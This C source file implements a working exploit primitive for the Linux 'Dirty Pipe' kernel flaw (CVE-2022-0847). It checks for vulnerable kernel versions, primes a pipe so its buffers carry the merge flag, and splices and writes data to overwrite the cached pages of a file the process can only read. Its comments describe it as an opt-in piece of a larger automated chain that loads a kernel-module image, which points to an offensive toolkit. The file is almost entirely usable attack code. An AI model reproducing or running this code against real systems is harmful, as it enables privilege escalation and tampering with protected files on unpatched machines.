/* CVE-2022-0847 "Dirty Pipe"
 * kernel: lib/iov_iter: initialize "flags" in new pipe_buffer
 *
 * A pipe_buffer can be created with PIPE_BUF_FLAG_CAN_MERGE pointing at a
 * page-cache page owned by another file, and write(2) will then append into
 * that page. Preconditions: kernel 5.8+ and before the fix (5.10.102,
 * 5.15.25, 5.16.11); the write must not start on a page boundary and must not
 * cross one; the file must be openable and the target page cached.
 *
 * Hard limits, both enforced by pipe_write(): a merge cannot begin at a page
 * boundary (offset + len == PAGE_SIZE gives a zero-byte copy) and cannot span
 * one. So a run must start unaligned and stay inside a single page. That is
 * enough for a small trampoline, not for the KO image, which is why this
 * primitive is opt-in rather than part of the auto chain.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>

#include "pagecache.h"

static int dp_version_ok(void)
{
    struct utsname u;
    int a = 0, b = 0, c = 0;

    if (uname(&u) != 0)
        return -1;
    if (sscanf(u.release, "%d.%d.%d", &a, &b, &c) != 3)
        return -1;

    if (a != 5 || b < 8)
        return -1;
    if (b == 10)
        return c < 102 ? 0 : -1;
    if (b == 15)
        return c < 25 ? 0 : -1;
    if (b == 16)
        return c < 11 ? 0 : -1;
    if (b > 16)
        return -1;
    return 0;   /* 5.8, 5.9, 5.11-5.14: EOL branches, fix only in 5.16.11 */
}

int pcw_dirtypipe_probe(void)
{
    return dp_version_ok();
}

/* Fill then drain the pipe so every pipe_buffer carries CAN_MERGE. */
static int dp_prime(int p[2])
{
    int sz = fcntl(p[1], F_GETPIPE_SZ);
    char *buf;
    int left;

    if (sz <= 0)
        sz = 65536;
    buf = malloc((size_t)sz);
    if (!buf)
        return -1;
    memset(buf, 'A', (size_t)sz);

    for (left = sz; left > 0; ) {
        ssize_t n = write(p[1], buf, (size_t)left);
        if (n <= 0) { free(buf); return -1; }
        left -= (int)n;
    }
    for (left = sz; left > 0; ) {
        ssize_t n = read(p[0], buf, (size_t)left);
        if (n <= 0) { free(buf); return -1; }
        left -= (int)n;
    }
    free(buf);
    return 0;
}

int pcw_dirtypipe_write_fd(int fd, off_t off, const void *data, size_t len)
{
    const uint8_t *p = data;
    int pfd[2];
    int rc = -1;

    if (len == 0)
        return dp_version_ok();
    /* Preflight the whole run: refuse rather than write a partial prefix. */
    if (off <= 0)                                  /* offset 0 cannot merge */
        return -1;
    if ((off & 0xfff) == 0)                        /* page-boundary start */
        return -1;
    if ((size_t)(0x1000 - (off & 0xfff)) < len)     /* crosses a page */
        return -1;
    if (pipe(pfd) < 0)
        return -1;
    if (dp_prime(pfd) < 0)
        goto out;

    while (len > 0) {
        off_t page_end = (off | 0xfff) + 1;
        size_t chunk = (size_t)(page_end - off);
        off_t one = off - 1;

        if (off % 4096 == 0)  /* cannot start a merge at a page boundary */
            goto out;
        if (chunk > len)
            chunk = len;

        if (splice(fd, &one, pfd[1], NULL, 1, 0) != 1)
            goto out;
        if (write(pfd[1], p, chunk) != (ssize_t)chunk)
            goto out;

        {
            uint8_t got[4096];
            ssize_t left = (ssize_t)chunk + 1;

            if (pread(fd, got, chunk, off) != (ssize_t)chunk ||
                memcmp(got, p, chunk) != 0)
                goto out;

            /* Drain the pipe or the next splice blocks once it fills. The page
             * write already happened; reading only frees the buffers. */
            while (left > 0) {
                ssize_t n = read(pfd[0], got, sizeof(got));
                if (n <= 0)
                    goto out;
                left -= n;
            }
        }

        off += (off_t)chunk;
        p += chunk;
        len -= chunk;
    }

    rc = 0;

out:
    close(pfd[0]);
    close(pfd[1]);
    return rc;
}
